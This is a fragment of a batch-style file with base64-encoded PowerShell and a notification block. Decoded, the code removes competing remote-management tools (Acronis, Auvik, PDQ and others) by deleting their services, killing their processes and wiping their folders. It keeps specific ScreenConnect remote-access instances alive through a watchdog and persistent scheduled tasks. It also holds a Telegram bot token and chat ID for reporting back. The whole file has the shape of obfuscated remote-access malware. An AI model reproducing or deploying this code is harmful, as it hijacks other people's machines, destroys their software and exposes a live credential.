b3gqJykgfQogICAgICAgIEB7IFRhZz0nQWNyb25pc0N5YmVyJzsgU3ZjPUAoJ0Fjcm9uaXMqJyk7
IFByb2M9QCgnYWNyb2NtZConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xBY3JvbmlzIiwi
JHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFjcm9uaXMiKTsgUHJvZD1AKCdBY3JvbmlzIEN5YmVy
KicsJ0Fjcm9uaXMgQWdlbnQqJywnQ3liZXIgUHJvdGVjdCBBZ2VudConKSB9CiAgICAgICAgQHsg
VGFnPSdEb21vdHonOyAgICAgICBTdmM9QCgnRG9tb3R6KicpOyBQcm9jPUAoJ0RvbW90eionKTsg
RGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xEb21vdHoiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2
KX1cRG9tb3R6Iik7IFByb2Q9QCgnRG9tb3R6KicpIH0KICAgICAgICBAeyBUYWc9J0F1dmlrJzsg
ICAgICAgIFN2Yz1AKCdBdXZpayonKTsgUHJvYz1AKCdBdXZpayonKTsgRGlycz1AKCIkZW52OlBy
b2dyYW1GaWxlc1xBdXZpayIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBdXZpayIpOyBQcm9k
PUAoJ0F1dmlrKicpIH0KICAgICAgICBAeyBUYWc9J0JhcnJhY3VkYVJNTSc7IFN2Yz1AKCdCYXJy
YWN1ZGEqJyk7IFByb2M9QCgnTVdTZXJ2aWNlKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVz
XEJhcnJhY3VkYSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxCYXJyYWN1ZGEiLCIkZW52OlBy
b2dyYW1GaWxlc1xMZXZlbCBQbGF0Zm9ybXMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTGV2
ZWwgUGxhdGZvcm1zIik7IFByb2Q9QCgnQmFycmFjdWRhIFJNTSonLCdNYW5hZ2VkIFdvcmtwbGFj
ZSonKSB9CiAgICAgICAgQHsgVGFnPSdHb3Zlcmxhbic7ICAgICBTdmM9QCgnR292ZXJsYW4qJyk7
IFByb2M9QCgnZ292ZXJsYW4qJywnZ292YWdlbnQqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmls
ZXNcR292ZXJsYW4iLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cR292ZXJsYW4iKTsgUHJvZD1A
KCdHb3ZlcmxhbionKSB9CiAgICAgICAgQHsgVGFnPSdQRFEnOyAgICAgICAgICBTdmM9QCgnUERR
KicpOyBQcm9jPUAoJ1BEUVJ1bm5lcionLCdQRFFJbnZlbnRvcnkqJywnUERRRGVwbG95KicpOyBE
aXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFkbWluIEFyc2VuYWwiLCIke2VudjpQcm9ncmFtRmls
ZXMoeDg2KX1cQWRtaW4gQXJzZW5hbCIsIiRlbnY6UHJvZ3JhbUZpbGVzXFBEUSIsIiR7ZW52OlBy
b2dyYW1GaWxlcyh4ODYpfVxQRFEiKTsgUHJvZD1AKCdQRFEgRGVwbG95KicsJ1BEUSBJbnZlbnRv
cnkqJywnUERRIENvbm5lY3QqJykgfQogICAgKQoKICAgIGZvcmVhY2ggKCR0b29sIGluICRybW0p
IHsKICAgICAgICAkaGl0ID0gJGZhbHNlCiAgICAgICAgZm9yZWFjaCAoJHBhdCBpbiAkdG9vbC5Q
cm9kKSB7CiAgICAgICAgICAgIGZvcmVhY2ggKCRyb290IGluICRzY3JpcHQ6VW5pbnN0YWxsUm9v
dHMpIHsKICAgICAgICAgICAgICAgIEdldC1DaGlsZEl0ZW0gJHJvb3QgLUVycm9yQWN0aW9uIFNp
bGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgJGRu
ID0gKEdldC1JdGVtUHJvcGVydHkgJF8uUFNQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRp
bnVlKS5EaXNwbGF5TmFtZQogICAgICAgICAgICAgICAgICAgIGlmICgkZG4gLWFuZCAkZG4gLWxp
a2UgJHBhdCkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoSXMtRGF0dG9LZWVwZXIgJGRu
KSB7IExvZyAicm1tX3NraXBfZGF0dG9fa2VlcCBbJGRuXSI7IHJldHVybiB9CiAgICAgICAgICAg
ICAgICAgICAgICAgIGlmIChVbmluc3RhbGwtUHJvZHVjdEtleSAkXykgeyAkbi5ybW0rKzsgJGhp
dCA9ICR0cnVlIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAg
ICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZm9yZWFjaCAoJHBhdCBpbiAkdG9vbC5TdmMpIHsK
ICAgICAgICAgICAgR2V0LVNlcnZpY2UgLU5hbWUgJHBhdCAtRXJyb3JBY3Rpb24gU2lsZW50bHlD
b250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgIGlmIChJcy1EYXR0b0tl
ZXBlciAkXy5OYW1lIC1vciBJcy1EYXR0b0tlZXBlciAkXy5EaXNwbGF5TmFtZSkgeyBMb2cgInJt
bV9za2lwX2RhdHRvX3N2YyAkKCRfLk5hbWUpIjsgcmV0dXJuIH0KICAgICAgICAgICAgICAgICYg
c2MuZXhlIHN0b3AgIiQoJF8uTmFtZSkiIDI+JjEgfCBPdXQtTnVsbAogICAgICAgICAgICAgICAg
U3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyA1MDAKICAgICAgICAgICAgICAgICYgc2MuZXhlIGRl
bGV0ZSAiJCgkXy5OYW1lKSIgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgICAgICAgICAkbi5ybW0r
KzsgJGhpdCA9ICR0cnVlOyBMb2cgInJtbV9zdmNfZGVsZXRlZCAkKCRfLk5hbWUpIFskKCR0b29s
LlRhZyldIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGZvcmVhY2ggKCRwYXQgaW4g
JHRvb2wuUHJvYykgewogICAgICAgICAgICBHZXQtUHJvY2VzcyAtTmFtZSAkcGF0IC1FcnJvckFj
dGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAg
U3RvcC1Qcm9jZXNzIC1JZCAkXy5JZCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
dWUKICAgICAgICAgICAgICAgICRuLnJtbSsrOyAkaGl0ID0gJHRydWU7IExvZyAicm1tX3Byb2Nf
a2lsbGVkICQoJF8uUHJvY2Vzc05hbWUpIFskKCR0b29sLlRhZyldIgogICAgICAgICAgICB9CiAg
ICAgICAgfQogICAgICAgIGZvcmVhY2ggKCRkIGluICR0b29sLkRpcnMpIHsKICAgICAgICAgICAg
aWYgKCRkIC1hbmQgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGQpKSB7CiAgICAgICAgICAgICAg
ICBpZiAoSXMtRGF0dG9LZWVwZXIgJGQpIHsgTG9nICJybW1fc2tpcF9kYXR0b19kaXIgJGQiOyBj
b250aW51ZSB9CiAgICAgICAgICAgICAgICBpZiAoRm9yY2UtUmVtb3ZlRGlyICRkKSB7ICRuLnJt
bSsrOyAkaGl0ID0gJHRydWU7IExvZyAicm1tX2Rpcl9yZW1vdmVkICRkIiB9CiAgICAgICAgICAg
ICAgICBlbHNlIHsgJG4uZmFpbCsrOyBMb2cgInJtbV9kaXJfUkVNT1ZFX0ZBSUxFRCAkZCIgfQog
ICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmICgkaGl0KSB7IExvZyAicm1tX2V4dGVy
bWluYXRlZCAkKCR0b29sLlRhZykiIH0KICAgIH0KCiAgICAkc3VtbWFyeSA9ICJleHRlcm1pbmF0
ZSBzdmM9JCgkbi5zdmMpIHByb2M9JCgkbi5wcm9jKSBkaXI9JCgkbi5kaXIpIHByb2R1Y3Q9JCgk
bi5wcm9kdWN0KSBybW09JCgkbi5ybW0pIGZhaWw9JCgkbi5mYWlsKSIKICAgIExvZyAkc3VtbWFy
eQogICAgcmV0dXJuICRzdW1tYXJ5Cn0KCmZ1bmN0aW9uIFVwZGF0ZS1TdGF0ZSB7CiAgICAka2Vl
cCA9IEAoR2V0LUtlZXBGaW5nZXJwcmludHMpCiAgICAkZ3J5eGFGcCA9IEdldC1Hcnl4YUZwCiAg
ICAkcHJpbSA9ICRudWxsOyAkYWx0ID0gJG51bGw7ICRzY3JpcHQ6Z3J5eGEgPSAkbnVsbAogICAg
Zm9yZWFjaCAoJHN2YyBpbiAoR2V0LVNlcnZpY2UgLU5hbWUgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50
KicpKSB7CiAgICAgICAgaWYgKCRzdmMuTmFtZSAtbWF0Y2ggJ1woKFswLTlhLWZdezE2fSlcKScp
IHsKICAgICAgICAgICAgaWYgKCRtYXRjaGVzWzFdIC1lcSAnNWY2MDEwNTc5ODUyZTUwNycpIHsg
JHByaW0gPSAiJCgkc3ZjLlN0YXR1cykiIH0KICAgICAgICAgICAgZWxzZWlmICgkbWF0Y2hlc1sx
XSAtZXEgJ2Y4NjFjODE0MGQ0NTM0MjcnKSB7ICRhbHQgPSAiJCgkc3ZjLlN0YXR1cykiIH0KICAg
ICAgICAgICAgZWxzZWlmICgkbWF0Y2hlc1sxXSAtZXEgJGdyeXhhRnApIHsgJHNjcmlwdDpncnl4
YSA9ICIkKCRzdmMuU3RhdHVzKSIgfQogICAgICAgIH0KICAgIH0KICAgICRmb3JlaWduID0gQCgp
CiAgICBmb3JlYWNoICgkc3ZjIGluIChHZXQtU2VydmljZSAtTmFtZSAnU2NyZWVuQ29ubmVjdCBD
bGllbnQqJykpIHsKICAgICAgICBpZiAoJHN2Yy5OYW1lIC1tYXRjaCAnXCgoWzAtOWEtZl17MTZ9
KVwpJyAtYW5kICRtYXRjaGVzWzFdIC1ub3RpbiAka2VlcCkgewogICAgICAgICAgICAkZm9yZWln
biArPSAkbWF0Y2hlc1sxXQogICAgICAgIH0KICAgIH0KICAgICRpZCA9IFJlYWQtSWRlbnRpdHkK
ICAgICR0YXNrc09rID0gMDsgJHRhc2tzVG90YWwgPSAwCiAgICBmb3JlYWNoICgkayBpbiAnVEFT
S19BJywnVEFTS19CJywnVEFTS19DJywnVEFTS19EJykgewogICAgICAgICR0YXNrc1RvdGFsKysK
ICAgICAgICAkdG4gPSBOb3JtYWxpemUtVGFza05hbWUgKFtzdHJpbmddJGlkWyRrXSkKICAgICAg
ICBpZiAoLW5vdCAkdG4pIHsgY29udGludWUgfQogICAgICAgICRtYXJrZXIgPSBpZiAoJGsgLWVx
ICdUQVNLX0InKSB7ICdldGxfbW9uLmNtZCcgfSBlbHNlIHsgJ293bl9tb24uY21kJyB9CiAgICAg
ICAgaWYgKChUZXN0LVRhc2tPd25zTW9uICR0biAkbWFya2VyKSAtb3IgKFRlc3QtVGFza093bnNN
b24gKCJcJHRuIikgJG1hcmtlcikpIHsgJHRhc2tzT2srKyB9CiAgICB9CiAgICBpZiAoLW5vdCAk
TW9uUGF0aCkgeyAkTW9uUGF0aCA9IEpvaW4tUGF0aCAkV29ya0RpciAnb3duX21vbi5jbWQnIH0K
ICAgICR3ZCA9IEVuc3VyZS1XYXRjaGRvZwogICAgJHByZXYgPSBAe30KICAgICRzdGF0ZVBhdGgg
PSBKb2luLVBhdGggJFdvcmtEaXIgJ3N0YXRlLmpzb24nCiAgICBpZiAoVGVzdC1QYXRoICRzdGF0
ZVBhdGgpIHsKICAgICAgICB0cnkgeyAoR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRzdGF0ZVBh
dGggLVJhdyB8IENvbnZlcnRGcm9tLUpzb24pLlBTT2JqZWN0LlByb3BlcnRpZXMgfCBGb3JFYWNo
LU9iamVjdCB7ICRwcmV2WyRfLk5hbWVdID0gJF8uVmFsdWUgfSB9IGNhdGNoIHt9CiAgICB9CiAg
ICAkaW5zdGFsbENvdW50ID0gMQogICAgaWYgKCRwcmV2Lmluc3RhbGxDb3VudCkgeyAkaW5zdGFs
bENvdW50ID0gW2ludF0kcHJldi5pbnN0YWxsQ291bnQgfQogICAgaWYgKCRwcmV2LnByaW0gLWFu
ZCAkcHJldi5wcmltIC1uZSAnUnVubmluZycgLWFuZCAkcHJpbSAtZXEgJ1J1bm5pbmcnKSB7ICRp
bnN0YWxsQ291bnQrKyB9CiAgICAkc3RhdGUgPSBbb3JkZXJlZF1AewogICAgICAgIGhvc3QgICAg
ICAgICA9ICRlbnY6Q09NUFVURVJOQU1FCiAgICAgICAgdHMgICAgICAgICAgID0gKEdldC1EYXRl
KS5Ub1VuaXZlcnNhbFRpbWUoKS5Ub1N0cmluZygnbycpCiAgICAgICAgYnVpbGQgICAgICAgID0g
JEJ1aWxkCiAgICAgICAgcHJpbSAgICAgICAgID0gJChpZiAoJHByaW0pIHsgJHByaW0gfSBlbHNl
IHsgJ01JU1NJTkcnIH0pCiAgICAgICAgYWx0ICAgICAgICAgID0gJChpZiAoJGFsdCkgeyAkYWx0
IH0gZWxzZSB7ICdNSVNTSU5HJyB9KQogICAgICAgIGdyeXhhICAgICAgICA9ICQoaWYgKCRzY3Jp
cHQ6Z3J5eGEpIHsgJHNjcmlwdDpncnl4YSB9IGVsc2UgeyAnTUlTU0lORycgfSkKICAgICAgICBn
cnl4YUZwICAgICAgPSAkZ3J5eGFGcAogICAgICAgIGZvcmVpZ24gICAgICA9ICRmb3JlaWduCiAg
ICAgICAgdGFza3NPayAgICAgID0gJHRhc2tzT2sKICAgICAgICB0YXNrc1RvdGFsICAgPSAkdGFz
a3NUb3RhbAogICAgICAgIHdhdGNoZG9nICAgICA9ICR3ZAogICAgICAgIGluc3RhbGxDb3VudCA9
ICRpbnN0YWxsQ291bnQKICAgICAgICBsYXN0SGVhbCAgICAgPSAkKGlmICgkRXh0cmEpIHsgKEdl
dC1EYXRlKS5Ub1VuaXZlcnNhbFRpbWUoKS5Ub1N0cmluZygnbycpIH0gZWxzZWlmICgkcHJldi5s
YXN0SGVhbCkgeyAkcHJldi5sYXN0SGVhbCB9IGVsc2UgeyAkbnVsbCB9KQogICAgICAgIG5vdGUg
ICAgICAgICA9ICRFeHRyYQogICAgfQogICAgKCRzdGF0ZSB8IENvbnZlcnRUby1Kc29uIC1Db21w
cmVzcykgfCBTZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJHN0YXRlUGF0aCAtRm9yY2UKICAgIHJl
dHVybiAkc3RhdGUKfQoKc3dpdGNoICgkQWN0aW9uKSB7CiAgICAnaW5pdCcgICAgICAgICAgICB7
ICRpZCA9IEluaXRpYWxpemUtSWRlbnRpdHk7ICRpZC5HZXRFbnVtZXJhdG9yKCkgfCBGb3JFYWNo
LU9iamVjdCB7ICIkKCRfLktleSk9JCgkXy5WYWx1ZSkiIH0gfQogICAgJ2lkZW50aXR5JyAgICAg
ICAgeyAkaWQgPSBSZWFkLUlkZW50aXR5OyAkaWQuR2V0RW51bWVyYXRvcigpIHwgRm9yRWFjaC1P
YmplY3QgeyAiJCgkXy5LZXkpPSQoJF8uVmFsdWUpIiB9IH0KICAgICd3YXRjaGRvZycgICAgICAg
IHsgSW5zdGFsbC1XYXRjaGRvZyB8IE91dC1OdWxsIH0KICAgICd3YXRjaGRvZy1lbnN1cmUnIHsg
RW5zdXJlLVdhdGNoZG9nIH0KICAgICd0YXNrcy1lbnN1cmUnICAgIHsgRW5zdXJlLVBlcnNpc3RU
YXNrcyB9CiAgICAnc3RhdGUnICAgICAgICAgICB7IFVwZGF0ZS1TdGF0ZSB8IENvbnZlcnRUby1K
c29uIC1Db21wcmVzcyB9CiAgICAncmVwYWlyJyAgICAgICAgICB7IFJlcGFpci1TQ1NlcnZpY2Ug
JEZwIH0KICAgICdyZWdpc3RlcmVkJyAgICAgIHsgVGVzdC1TQ1JlZ2lzdGVyZWQgJEZwIH0KICAg
ICdleHRlcm1pbmF0ZScgICAgIHsgSW52b2tlLUV4dGVybWluYXRlIH0KICAgICdncnl4YS1oZWFs
dGgnICAgIHsgVGVzdC1Hcnl4YUhlYWx0aCB9CiAgICAnZ3J5eGEtZW5zdXJlJyAgICB7IEludm9r
ZS1Hcnl4YUVuc3VyZSB9Cn0K
::B64_LIB_END

::B64_NTF_BEGIN
Qk9UX1RPS0VOPTg2MTk3MTU3NTQ6QUFGTWsyTmpORC1oUWsyeFBGWWppY0hmQjVNeUt0Y1hDcWcK
Q0hBVF9JRD03NTQ3NDYyMDcwCg==
::B64_NTF_END
